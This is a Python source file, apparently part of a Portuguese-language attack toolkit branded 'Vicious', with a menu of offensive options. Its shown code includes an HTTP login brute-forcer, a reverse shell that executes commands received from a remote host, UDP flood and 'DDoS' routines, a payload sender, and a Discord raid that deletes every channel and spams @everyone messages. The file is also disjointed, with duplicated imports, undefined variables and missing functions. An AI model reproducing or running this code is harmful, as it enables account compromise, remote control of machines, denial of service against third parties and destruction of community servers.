from itertools import product
import string

def brute_force_http():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 TESTE DE FORÇA BRUTA EM HTTP 💥\n")

    target_url = input(Fore.WHITE + "Digite a URL de login alvo (ex: http://site.com/login): " + Fore.LIGHTRED_EX)
    login_field = input(Fore.WHITE + "Nome do campo de login (ex: username): " + Fore.LIGHTRED_EX)
    password_field = input(Fore.WHITE + "Nome do campo de senha (ex: password): " + Fore.LIGHTRED_EX)
    username = input(Fore.WHITE + "Nome de usuário para o ataque: " + Fore.LIGHTRED_EX)

    # Definir o conjunto de caracteres para força bruta
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

    # Definindo o comprimento da senha para o teste
    password_length = int(input(Fore.WHITE + "Comprimento da senha a ser testada: " + Fore.LIGHTRED_EX))

    # Gerando todas as combinações possíveis
    print(Fore.LIGHTRED_EX + f"\n🔍 Iniciando ataque de força bruta na URL {target_url}...\n")
    for password in product(charset, repeat=password_length):
        password = ''.join(password)
        data = {login_field: username, password_field: password}

        # Enviar a solicitação POST com as credenciais de login
        try:
            response = requests.post(target_url, data=data)
            if "incorrect" not in response.text.lower() and response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + f"✅ Senha encontrada: {password}")
                break
            else:
                print(Fore.YELLOW + f"Tentando senha: {password}")
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"❌ Erro na solicitação: {e}")
            break

    print(Fore.LIGHTRED_EX + "💥 Teste de Força Bruta finalizado!")
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Enviar Payload Reverso ------------------------------
import socket
import os
import subprocess

def reverse_shell(payload_host, payload_port):
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 ENVIAR PAYLOAD REVERSO 💥\n")

    print(Fore.WHITE + "Conectando ao host alvo via reverse shell...")

    # Configurar o socket
    try:
        # Cria o socket para a conexão
        reverse_shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        reverse_shell.connect((payload_host, payload_port))
        print(Fore.LIGHTGREEN_EX + "✅ Conexão estabelecida com o host alvo.")

        # Enviar shell reverso
        while True:
            # Receber comando da máquina atacante
            data = reverse_shell.recv(1024).decode('utf-8')

            if data.lower() == "exit":
                break

            # Executar o comando e enviar a saída de volta
            if data:
                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = cmd.communicate()

                if stdout:
                    reverse_shell.send(stdout)
                else:
                    reverse_shell.send(stderr)

        reverse_shell.close()
        print(Fore.LIGHTRED_EX + "💥 Conexão encerrada.")
    except Exception as e:
        print(Fore.RED + f"❌ Erro: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Scanner de Vulnerabilidades de Redes -------------------
import nmap
from colorama import Fore

def scanner_vulnerabilidades_redes():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🔍 SCANNER DE VULNERABILIDADES DE REDES 🔍\n")

    # Solicitar IP ou endereço de rede para escanear
    target = input(Fore.WHITE + "Digite o IP ou endereço de rede para escanear: ")

    # Criar o objeto scanner
    scanner = nmap.PortScanner()

    try:
        print(Fore.LIGHTYELLOW_EX + f"Iniciando o escaneamento no alvo: {target}")
        # Iniciar o escaneamento em busca de vulnerabilidades
        scanner.scan(target, '1-1024', '-v -sS')

        print(Fore.GREEN + "\n🔍 Resultados do Escaneamento:\n")

        # Exibir informações dos hosts encontrados
        for host in scanner.all_hosts():
            print(Fore.YELLOW + f"\nHost: {host} ({scanner[host].hostname()})")
            print(Fore.CYAN + f"Estado: {scanner[host].state()}")

            # Exibir portas abertas
            for proto in scanner[host].all_protocols():
                print(Fore.BLUE + f"Protocolo: {proto}")
                ports = scanner[host][proto].keys()
                for port in ports:
                    print(Fore.GREEN + f"Porta {port} aberta: {scanner[host][proto][port]['name']}")

        print(Fore.LIGHTGREEN_EX + "\n🔍 Escaneamento de vulnerabilidades concluído com sucesso.")
    except Exception as e:
        print(Fore.RED + f"❌ Erro: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Ataque de DDoS (Controlado) -------------------
import socket
import random
import threading
from colorama import Fore

def ataque_ddos():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 ATAQUE DE DDoS CONTROLADO 💥\n")

    try:
        ip = input(Fore.WHITE + "Digite o IP do servidor alvo: ")
        porta = int(input("Digite a porta alvo: "))
        pacotes = int(input("Quantidade de pacotes a enviar por thread (ex: 500): "))
        threads_count = int(input("Quantidade de threads (ex: 100): "))

        stop_attack = threading.Event()

        def dos():
            while not stop_attack.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (ip, porta)
                    for _ in range(pacotes):
                        if stop_attack.is_set():
                            break
                        s.sendto(random._urandom(1024), addr)
                    print(Fore.LIGHTRED_EX + f"[DDoS] {ip}:{porta} Pacotes enviados com sucesso.")
                except Exception as e:
                    print(Fore.YELLOW + f"[!] Erro no envio de pacotes: {e}")

        print(Fore.LIGHTGREEN_EX + "\n💥 Iniciando ataque... Pressione Ctrl+C para parar!\n")

        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=dos)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Ataque interrompido manualmente. Aguarde...")
            stop_attack.set()
            for t in threads:
                t.join(timeout=1.0)
            print(Fore.GREEN + "[+] Ataque finalizado com sucesso!")

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Operação cancelada pelo usuário.")
    except Exception as e:
        print(Fore.RED + f"\n[!] Erro: {e}")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Flood UDP -------------------
import socket
import random
import threading
from colorama import Fore

def flood_udp():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n🌊 FLOOD UDP CONTROLADO 🌊\n")

    ip = input(Fore.WHITE + "Digite o IP do servidor alvo: ")
    porta = int(input("Digite a porta alvo: "))
    pacotes = int(input("Quantidade de pacotes a enviar por thread (ex: 500): "))
    threads_count = int(input("Quantidade de threads (ex: 100): "))

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (ip, porta)
                for _ in range(pacotes):
                    s.sendto(random._urandom(1024), addr)
                print(Fore.LIGHTRED_EX + f"[Flood UDP] {ip}:{porta} Pacotes enviados com sucesso.")
            except Exception as e:
                print(Fore.YELLOW + f"[!] Erro no envio de pacotes: {e}")

    print(Fore.LIGHTGREEN_EX + "\n🌊 Iniciando Flood UDP... Pressione Ctrl+C para parar!\n")

    # Criando as threads
    try:
        for _ in range(threads_count):
            thread = threading.Thread(target=flood)
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nFlood UDP interrompido manualmente.")

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Payload para Exploit -------------------
import socket
import os
from colorama import Fore

def generate_payload():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n⚠️ GERADOR DE PAYLOADS PARA EXPLOIT ⚠️\n")

    ip = input(Fore.WHITE + "Digite o IP alvo para o exploit: ")
    porta = int(input("Digite a porta do serviço alvo: "))
    comando = input("Digite o comando ou payload a ser executado (ex: 'nc -lvp 4444'): ")

    def create_payload():
        try:
            payload = f"Exploit: {comando} | Target: {ip}:{porta}"
            print(Fore.GREEN + f"[✔️] Payload gerado: {payload}")

            # Criando o socket e enviando o payload
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, porta))
            s.sendall(payload.encode())
            print(Fore.LIGHTRED_EX + f"[⚡] Enviando payload para {ip}:{porta}...")
            s.close()
            print(Fore.LIGHTGREEN_EX + f"[✔️] Payload enviado com sucesso para {ip}:{porta}.")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Erro ao enviar payload: {e}")

    # Gerando o payload
    create_payload()

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Backup de Arquivos Remotos -------------------
import os
import shutil
from colorama import Fore

def backup_remoto():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n⚠️ BACKUP DE ARQUIVOS REMOTOS ⚠️\n")

    host = input(Fore.WHITE + "Digite o IP ou domínio do servidor de destino: ")
    usuario = input("Digite o usuário para autenticação (se necessário): ")
    senha = input("Digite a senha para autenticação (se necessário): ")

    local_path = input("Digite o caminho local do arquivo ou diretório a ser copiado: ")
    remote_path = input("Digite o caminho remoto onde o arquivo será copiado: ")

    def backup_files():
        try:
            # Verificando se o arquivo existe localmente
            if not os.path.exists(local_path):
                print(Fore.YELLOW + "[!] O arquivo ou diretório local não foi encontrado!")
                return

            # Criando um diretório remoto (simulado)
            print(Fore.LIGHTGREEN_EX + f"[✔️] Preparando backup para {host}...")
            remote_backup_dir = f"//{host}/{remote_path}"

            # Simulando o envio do arquivo
            shutil.copy(local_path, remote_backup_dir)
            print(Fore.GREEN + f"[✔️] Backup do arquivo {local_path} para {remote_backup_dir} realizado com sucesso!")

        except Exception as e:
            print(Fore.YELLOW + f"[!] Erro ao realizar backup: {e}")

    # Iniciando o backup
    backup_files()

    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
    menu()

# ---------------------- Bot Raid -------------------
import discord
import asyncio
import random
import os
import time

intents = discord.Intents.all()
client = discord.Client(intents=intents)

# ========== FUNÇÕES DE INTERFACE ==========

def print_lento(texto, atraso=0.01):
    for char in texto:
        print(char, end='', flush=True)
        time.sleep(atraso)
    print()

def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

def bot_raid():
    ascii_art()
    print(Fore.LIGHTRED_EX + "\n💥 BOT RAID 💥\n")
    
    token = input(Fore.WHITE + "Digite o token do bot: " + Fore.LIGHTRED_EX)
    guild_id = input(Fore.WHITE + "Digite o ID do servidor: " + Fore.LIGHTRED_EX)
    num_channels = int(input(Fore.WHITE + "Digite a quantidade de canais a serem criados: " + Fore.LIGHTRED_EX))
    
    server_name = "☠️ DOMINADO PELA VICIOUS TEAM ☠️"
    discord_invite = "https://discord.gg/7jgYqTaNyV"
    
    channel_names = [
        "v̸̢͎̘͉̿͋̌i̵͕̿c̷͚̥̈́ì̶̯̤̲o̴͈͂̈́ṵ̵̡̨̖̇͝s̶͙̈́", "v̶̗̒͝1c10us", "V̴̺̎̋͜1̴͙̋C̵͎̊1̴͙̋0̵͎̊Ű̴͙S̵͎̊", "v̷i̷c̷i̷o̷u̷s̷-x", "v1c1øus-3mp1r3",
        "ⓥⓘⓒⓘⓞⓤⓢ", "v̶̺̼̪̈́͜ī̶̢̯c̸͎̣̈́̔̈́ȉ̷̲̲̐o̵͇͛̈́̉ũ̶̝̜̥s̶̺̐͠", "vιcισυѕ-∂єαтн", "v̵̡̛̠̲̭͙̦̞̝̲̘̪̩̙͇̓̅̈́̅͐̈́̍̈́̎̾̀͛͝į̸̮̭̦̰̓̄̎̊͒̽̍̆̈́̏̋͑̕͝c̴̡̹̩̹̩̬̳̺̪͚̱̒̔̋̾̈́̍̐̈́̅̈́̃̚į̵̝͕̥̘̖̘̩̤̝̯͓̻͗͆̌̽̈̍̊̈́̓͑͝ờ̴̡̧̧̠̻̹̣̰̪͔̮̗̬̊̒̒̅̀̇̃͆̉͆͛͘ų̸̟̙̼̯̭̩̺̖͔̇̉̊̌̅̅̊͋̽̑̅̍̈́̌͝s̵̢̭̩̑̑̀̐̌̿̃̍̂̌̽̂̂", "v1c10us-h4ck",
        "🆅🅸🅲🅸🅾🆄🆂", "v̴̧̢̖̞̬̱̮̥̠͔̜̫̈́̅̈́͛̓̋̈́̄͘͝͝į̴̛̥͕̺̜̺̜̘̺̣̿̓̂̊̆͌̂͌̆̅̚͜͝͝c̸̢̧̩͖̩̻̦̩̦̥͍̭̹̓͐̄͗̅̕̚ͅi̴̡̳̬̖̝̤̜̱̖̥̾̿̈́̊͆̂̊̽̏͆̆̃̔͘͜͝o̴̡̡̢̢̝̯͚̙͚̜̜͚͆̉̔̆̅̾̍̍̈́̿̿̚͜͜͠͝ͅͅů̸̧̨̨̧̘̭͚̲̗̩̩̝̋̆̒̈́̈́̊͝s̷̛̛̫̦̜̦̲̔̈́̓̈́̿̄̎̑̈́̕͝", "v̸̛̤̩̫͖̦̈́̐͘͜i̷̧̢̯̙̎͒̏c̶̨̨̝̦̖̑̋̍̌̈́i̴̘͎̊̿̎̈̕ọ̵̦̤͝u̶̘̪̠̦͛͘s̴̹̣̃̃-ẗ̸̝̬́̑̽̾e̵͓̫̜̽̂̄a̶͉̗̺͗͌̿̕m̸̧̼̺͖̆̿̕", "v̸̢̜̮̈́̈́̅ḯ̵̭͙̕c̴̨̭̊i̵̧̮̒͠ǫ̷̱͊̂u̶̙̽̈́s̶̠̈́̈-ḱ̵̠̱̈́͘ͅḯ̶̺̟̞̎̔ṋ̸̫̖̒̃g̴̥̝̽̚", "v1c10us-3l1t3"
    ]
    
    min_messages = int(input(Fore.WHITE + "Digite o número mínimo de mensagens por canal: " + Fore.LIGHTRED_EX))
    max_messages = int(input(Fore.WHITE + "Digite o número máximo de mensagens por canal: " + Fore.LIGHTRED_EX))
    
    embed_messages = [
        {"title": "💀 VICIOUS TEAM DOMINOU", "description": f"Entre no servidor oficial da Vicious:\n{discord_invite}", "color": 0xFF0000},
        {"title": "⚠️ SERVIDOR DOMINADO", "description": f"Vicious  passou por aqui\nJunte-se a nós: {discord_invite}", "color": 0xFF4500},
        {"title": "☣️ VICIOUS TEAM REINA", "description": f"Faça parte do melhor grupo hacker\n{discord_invite}", "color": 0x800080},
        {"title": "⚡ VICIOUS DOMINOU TUDO", "description": f"Entre para a Vicious:\n{discord_invite}", "color": 0x8B0000},
        {"title": "🔥 VICIOUS É PODER", "description": f"Servidor oficial da Vicious:\n{discord_invite}", "color": 0xFF8C00}
    ]
    
    try:
        headers = {
            'Authorization': f'Bot {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'DiscordBot (https://discord.com) Python/3.8'
        }
        
        # First change the server name
        guild_name_url = f'https://discord.com/api/v9/guilds/{guild_id}'
        guild_name_data = {'name': server_name}
        requests.patch(guild_name_url, headers=headers, json=guild_name_data)
        
        # Primeiro deleta todos os canais existentes
        channels_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        response = requests.get(channels_url, headers=headers)
        channels = response.json()
        
        if isinstance(channels, list):
            for channel in channels:
                if isinstance(channel, dict) and 'id' in channel and 'name' in channel:
                    delete_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                    requests.delete(delete_url, headers=headers)
                    print(Fore.GREEN + f"Canal {channel['name']} deletado!")
            
            # Cria novos canais e envia mensagens
            for i in range(num_channels):
                random_name = f"{random.choice(channel_names)}-{random.randint(100,999)}"
                channel_data = {
                    'name': random_name,
                    'type': 0  # 0 = canal de texto
                }
                
                response = requests.post(channels_url, headers=headers, json=channel_data)
                if response.status_code == 201:
                    new_channel = response.json()
                    print(Fore.LIGHTGREEN_EX + f"Canal {new_channel['name']} criado!")
                    
                    # Envia mensagens aleatórias com embed no novo canal
                    message_url = f'https://discord.com/api/v9/channels/{new_channel["id"]}/messages'
                    num_messages = random.randint(min_messages, max_messages)
                    
                    for _ in range(num_messages):
                        embed = random.choice(embed_messages)
                        message_data = {
                            'content': '@everyone',
                            'embeds': [
                                {
                                    'title': embed['title'],
                                    'description': embed['description'],
                                    'color': embed['color'],
                                    'footer': {'text': '🔥 Vicious passou por aqui 🔥'}
                                }
                            ]
                        }
                        requests.post(message_url, headers=headers, json=message_data)
                        print(Fore.CYAN + f"Mensagem enviada no canal {new_channel['name']}!")
                else:
                    print(Fore.RED + f"Erro ao criar canal: {response.status_code}")
            
            print(Fore.LIGHTGREEN_EX + "\n✅ Raid concluído com sucesso!")
        else:
            print(Fore.RED + "Erro: Falha na autenticação. Verifique se o token do bot está correto e se ele tem as permissões necessárias.")
            
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"\n❌ Erro durante o raid: {str(e)}")
    
    input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")

# ========== CONFIGURAÇÕES ==========
GLITCHED_NAME = "💀 HACKED BY VICIOUS 💀"
CHANNEL_NAMES = ["vicious", "hacked-by-vicious", "invaded", "owned-by-vicious", "vx-danger", "redoverride", "error-vx"]
SPAM_MESSAGES = [
    "@everyone Vicious passou por aqui.",
    "@everyone hacked by Vicious.",
    "@everyone O controle agora é nosso.",
    "@everyone Isso é apenas o começo.",
    "@everyone Seus dados estão comprometidos.",
    "@everyone Nós vemos tudo.",
    "@everyone Este servidor foi dominado por Vicious."
]
GIF_URL = "https://media.tenor.com/g07C3F0akFwAAAAC/hacker-anonymous.gif"
EMBED_COLOR = 0xFF0000

# ========== BOT ==========
@client.event
async def on_ready():
    print(f"✅ Bot conectado como: {client.user}")

    guild = discord.utils.get(client.guilds, id=GUILD_ID)

    if guild is None:
        print("❌ O bot não está no servidor ou o ID é inválido.")
        await client.close()
        return

    try:
        await guild.edit(name=GLITCHED_NAME)
    except Exception as e:
        print(f"⚠️ Erro ao renomear servidor: {e}")

    print("🧨 Deletando canais existentes...")
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)

    await asyncio.sleep(1)

    print("💥 Criando canais e enviando mensagens...")

    async def criar_canal(index):
        nome = f"{random.choice(CHANNEL_NAMES)}-{random.randint(100,999)}"
        canal = await guild.create_text_channel(nome)

        for _ in range(3):
            msg = random.choice(SPAM_MESSAGES)
            embed = discord.Embed(
                title="🔴 HACKED BY VICIOUS",
                description="```SISTEMA COMPROMETIDO```",
                color=EMBED_COLOR
            )
            embed.set_image(url=GIF_URL)
            embed.set_footer(text="🩸 VICIOUS passou por aqui.")
            await canal.send(content="@everyone " + msg, embed=embed)

    tarefas = [criar_canal(i) for i in range(100)]
    await asyncio.gather(*tarefas)

    print("✅ Concluído com sucesso.")
    await client.close()

@client.event
async def on_error(event, *args, **kwargs):
    print("❌ Erro inesperado durante a execução.")

try:
    client.run(TOKEN)
except discord.LoginFailure:
    print("❌ Token inválido. Verifique e tente novamente.")
    time.sleep(3)
    os.execlp("python", "python", __file__)  # Reinicia o script
except Exception as e:
    print(f"❌ Erro inesperado: {e}")

# Função para o menu
def handle_ctrl_c(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Operação cancelada pelo usuário.")
            input(Fore.YELLOW + "\nPressione ENTER para voltar ao menu...")
            menu()
    return wrapper

# Aplicando o decorator em todas as funções
ip_lookup = handle_ctrl_c(ip_lookup)
port_scanner = handle_ctrl_c(port_scanner)
http_flood = handle_ctrl_c(http_flood)
tcp_syn_flood = handle_ctrl_c(tcp_syn_flood)
insane_mode = handle_ctrl_c(insane_mode)
brute_force_login = handle_ctrl_c(brute_force_login)
dns_scanner = handle_ctrl_c(dns_scanner)
web_crawler = handle_ctrl_c(web_crawler)
subdomain_scanner = handle_ctrl_c(subdomain_scanner)
vulnerability_scanner = handle_ctrl_c(vulnerability_scanner)
data_exfiltration = handle_ctrl_c(data_exfiltration)
base64_decoder = handle_ctrl_c(base64_decoder)
md5_decoder = handle_ctrl_c(md5_decoder)
web_shell_detection = handle_ctrl_c(web_shell_detection)
ssl_scanner = handle_ctrl_c(ssl_scanner)
packet_sniffer = handle_ctrl_c(packet_sniffer)
xss_attack = handle_ctrl_c(xss_attack)
sql_injection = handle_ctrl_c(sql_injection)
brute_force_http = handle_ctrl_c(brute_force_http)
reverse_shell = handle_ctrl_c(reverse_shell)
scanner_vulnerabilidades_redes = handle_ctrl_c(scanner_vulnerabilidades_redes)
ataque_ddos = handle_ctrl_c(ataque_ddos)
flood_udp = handle_ctrl_c(flood_udp)
generate_payload = handle_ctrl_c(generate_payload)
backup_remoto = handle_ctrl_c(backup_remoto)
bot_raid = handle_ctrl_c(bot_raid)

def menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.RED + Style.BRIGHT + r"""
██╗   ██╗██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗    ██████╗  █████╗ ██╗███╗   ██╗███████╗██╗     
██║   ██║██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝    ██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██║     
██║   ██║██║██║     ██║██║   ██║██║   ██║███████╗    ██████╔╝███████║██║██╔██╗ ██║█████╗  ██║     
╚██╗ ██╔╝██║██║     ██║██║   ██║██║   ██║╚════██║    ██╔═══╝ ██╔══██║██║██║╚██╗██║██╔══╝  ██║     
 ╚████╔╝ ██║╚██████╗██║╚██████╔╝╚██████╔╝███████║    ██║     ██║  ██║██║██║ ╚████║███████╗███████╗
  ╚═══╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
                                                                                                  

""")
        print(Fore.RED + Style.BRIGHT + "="*60)
        print(Fore.WHITE + Style.BRIGHT + " " * 15 + "PAINEL DE OPERAÇÕES - VICIOUS")
        print(Fore.RED + Style.BRIGHT + "="*60)
        print(Fore.RED + '''

[1] IP Lookup
[2] Scanner de Portas
[3] HTTP Flood
[4] TCP SYN Flood
[5] Modo Insano (HTTP + SYN + Portscan)
[6] Brute Force
[7] Scanner DNS
[8] Web Crawler
[9] Reconhecimento de Subdomínios
[10] Scanner de Vulnerabilidades
[11] Exfiltração de Dados
[12] Decodificador Base64
[13] Decodificador MD5
[14] Reconhecimento de Web Shell
[15] Scanner de SSL
[16] Sniffer de Pacotes
[17] Ataque XSS
[18] Injeção SQL
[19] Teste de Força Bruta em HTTP
[20] Enviar payload reverso
[21] Scanner de Vulnerabilidades de Redes
[22] Ataque de DDoS
[23] Flood UDP
[24] Payload para Exploit
[25] Backup de Arquivos Remotos
[26] Bot Raid
[0] Sair
''')
        choice = input(Fore.WHITE + "[+] Escolha uma opção: ")

        if choice == '1':
            ip_lookup()
        elif choice == '2':
            port_scanner()
        elif choice == '3':
            http_flood()
        elif choice == '4':
            tcp_syn_flood()
        elif choice == '5':
            insane_mode()
        elif choice == '6':
            brute_force_login()
        elif choice == '7':
            dns_scanner()
        elif choice == '8':
            web_crawler()
        elif choice == '9':
            subdomain_scanner()
        elif choice == '10':
            vulnerability_scanner()
        elif choice == '11':
            data_exfiltration()
        elif choice == '12':
            base64_decoder()
        elif choice == '13':
            md5_decoder()
        elif choice == '14':
            web_shell_detection()
        elif choice == '15':
            ssl_scanner()
        elif choice == '16':
            packet_sniffer()
        elif choice == '17':
            xss_attack()
        elif choice == '18':
            sql_injection()
        elif choice == '19':
            brute_force_http()
        elif choice == '20':
            reverse_shell()
        elif choice == '21':
            scanner_vulnerabilidades_redes()
        elif choice == '22':
            ataque_ddos()
        elif choice == '23':
            flood_udp()
        elif choice == '24':
            generate_payload()
        elif choice == '25':
            backup_remoto()
        elif choice == '26':
            bot_raid()
        elif choice == '0':
            print(Fore.GREEN + "[+] Saindo...")
            break
        else:
            print(Fore.RED + "[!] Opção inválida.")
            time.sleep(2)

        # Pausar e voltar para o menu apenas quando o usuário pressionar Enter
        input(Fore.WHITE + "\n[+] Pressione Enter para voltar ao menu...")

# Chama a função principal do menu
menu()
try:
    # Some code that may raise an exception
    ...
except Exception as e:
    print(Fore.LIGHTRED_EX + f"Erro ao verificar {url_to_check}: {e}")
